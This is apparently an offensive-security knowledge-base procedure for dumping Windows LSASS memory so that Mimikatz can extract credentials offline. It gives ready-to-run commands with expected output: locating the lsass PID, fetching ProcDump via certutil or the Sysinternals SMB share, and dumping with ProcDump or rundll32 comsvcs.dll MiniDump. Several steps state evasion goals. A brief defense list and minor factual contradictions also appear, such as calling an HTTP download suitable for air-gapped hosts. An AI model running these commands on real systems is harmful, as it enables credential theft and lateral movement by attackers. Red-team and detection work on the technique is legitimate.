---
id: dc16b4de-6b7d-4ad6-9504-30ff1bbe95d6
name: windows-lsass-mini-dump-for-mimikatz
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:27.186048+00:00'
updated_at: '2023-04-10T20:37:14.759842+00:00'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
techniques:
  - '[[techniques/Credential Dumping|T1003 - Credential Dumping]]'
sub_techniques: []
tags:
  - '[[tags/mini-dump]]'
  - '[[tags/windows-mimikatz]]'
commands:
  - '[[commands/find-lsass-pid]]'
  - '[[commands/download-procdump-http]]'
  - '[[commands/create-lsass-dump-http]]'
  - '[[commands/map-sysinternals-smb]]'
  - '[[commands/create-lsass-dump-smb]]'
  - '[[commands/rundll32-minidump-lsass]]'
platforms:
  - Windows
tools:
  - '[[tools/ProcDump]]'
validated: true
---

# windows-lsass-mini-dump-for-mimikatz

## Summary

This procedure demonstrates how to create a mini dump of the LSASS process memory on a Windows system using Sysinternals Procdump tool via HTTP or SMB methods, or alternatively using the built-in rundll32 with comsvcs.dll MiniDump function. The resulting dump file can be transferred off the target and analyzed with tools like Mimikatz to extract credentials, hashes, and tickets for lateral movement or privilege escalation.

## Description

The LSASS (Local Security Authority Subsystem Service) process stores sensitive authentication material in memory, including NTLM hashes, Kerberos tickets, and plaintext passwords under certain conditions. Dumping LSASS memory is a common post-exploitation technique for credential access. This procedure avoids direct use of Mimikatz on the target to evade detection, instead generating a portable dump file. The HTTP method uses certutil for download, suitable for air-gapped or firewalled environments. The SMB method leverages the public Sysinternals share for retrieval. The rundll32 alternative uses native Windows APIs for dumping without external tools. Success requires administrative privileges, and the dump should be minimized (mini dump) to reduce file size and suspicion. This maps to MITRE ATT&CK T1003 for credential dumping, typically after initial access via TA0001.

## Requirements

1. Administrative privileges on the target Windows system (local or remote via tools like PSExec).
2. Network access to download Procdump if using HTTP/SMB methods (outbound to live.sysinternals.com).
3. PowerShell or Command Prompt access.
4. Sufficient disk space on the target for the dump file (typically 50-200 MB for mini dump).
5. [[tools/ProcDump]] for the primary methods, or none for the rundll32 alternative.

## Defense

- Enable Credential Guard and LSA Protection to prevent LSASS dumping (blocks MiniDump calls).
- Monitor for process creation of procdump.exe, rundll32.exe with comsvcs.dll, or certutil.exe downloads.
- Implement application whitelisting to block unsigned tools like Procdump.
- Use EDR tools to detect anomalous memory reads from LSASS or unusual network fetches from Sysinternals.
- Audit privileged process access and dump file creation in sensitive directories.

## Objectives

1. Identify the LSASS process ID for targeted dumping.
2. Download and execute dumping tools without triggering AV/EDR.
3. Generate a mini dump file containing LSASS memory for offline credential extraction.
4. Verify dump integrity for subsequent analysis with Mimikatz or similar tools.

## Instructions

### Step 1: Identify LSASS Process ID

**Context**: Locate the process ID (PID) of lsass.exe, as it's required for precise dumping to avoid errors or dumping the wrong process.

**Command** ([[commands/find-lsass-pid]]):
```cmd
tasklist /fi "imagename eq lsass.exe"
```

> This command lists running processes filtered by name. Look for the PID column (e.g., 1234). Note it for use in later steps. If multiple instances appear (rare), select the one with high memory usage.

**Expected Output**:
```
Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============ 
lsass.exe                      1234 Services                   0    145,280 K
```

### Step 2: Download Procdump Using HTTP Method

**Context**: Fetch Procdump from the official Sysinternals server using the built-in certutil tool, which blends with legitimate certificate management traffic.

**Command** ([[commands/download-procdump-http]]):
```cmd
certutil -urlcache -split -f http://live.sysinternals.com/procdump.exe C:\Users\Public\procdump.exe
```

> This downloads procdump.exe to a public directory. The -f flag forces download even if cached. Verify the file exists post-execution.

**Expected Output**:
```
CertUtil: -URLcache command completed successfully.
```

### Step 3: Create LSASS Mini Dump Using HTTP Method

**Context**: Use the downloaded Procdump to create a full memory dump of LSASS by process name, accepting the EULA automatically to avoid interactive prompts.

**Command** ([[commands/create-lsass-dump-http]]):
```cmd
C:\Users\Public\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

> The -ma flag creates a full mini dump including all memory. Output file lsass.dmp will be generated in the current directory. Transfer this file off-host for analysis.

**Expected Output**:
```
Procdump v10.1 - Sysinternals - www.sysinternals.com

Procdump is part of Sysinternals utilities.

Copyright (C) 2008-2016 Mark Russinovich and Sysinternals

Processes: lsass.exe (1234)

Dump file: lsass.dmp

[Memory dump completed]
```

### Step 4: Map Sysinternals SMB Share

**Context**: For the SMB method, map the public Sysinternals tools share to a drive letter, allowing direct access without HTTP traffic.

**Command** ([[commands/map-sysinternals-smb]]):
```cmd
net use Z: \\live.sysinternals.com\tools
```

> This mounts the share as Z:. If authentication is required (rare for public share), provide guest credentials. Verify mapping with dir Z:.

**Expected Output**:
```
The command completed successfully.
```

### Step 5: Create LSASS Mini Dump Using SMB Method

**Context**: Execute Procdump from the mapped share using the LSASS PID to create the dump, avoiding local download traces.

**Command** ([[commands/create-lsass-dump-smb]]):
```cmd
Z:\procdump.exe -accepteula -ma $_LSASS_PID lsass.dmp
```

> Replace $_LSASS_PID with the actual PID from Step 1. This runs the tool directly from the share. The dump file lsass.dmp is created locally.

**Expected Output**:
```
Procdump v10.1 - Sysinternals - www.sysinternals.com

[Similar to HTTP method output, confirming dump creation]
```

### Step 6: Alternative - Dump LSASS Using Rundll32 MiniDump

**Context**: If external tools are blocked, use the native comsvcs.dll MiniDump function via rundll32 to create a full dump by PID, minimizing footprint.

**Command** ([[commands/rundll32-minidump-lsass]]):
```powershell
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $_LSASS_PID C:\temp\lsass.dmp full
```

> The 'full' parameter ensures a complete mini dump. Create C:\temp if needed. This method requires SeDebugPrivilege.

**Expected Output**:
```
[No console output; check file existence and size to confirm success]
```

**Success Indicators**:
- Dump file (lsass.dmp) exists and is non-zero size (>10 MB typically).
- No errors in command output (e.g., access denied or process not found).
- File can be opened in tools like Volatility or Mimikatz without corruption.
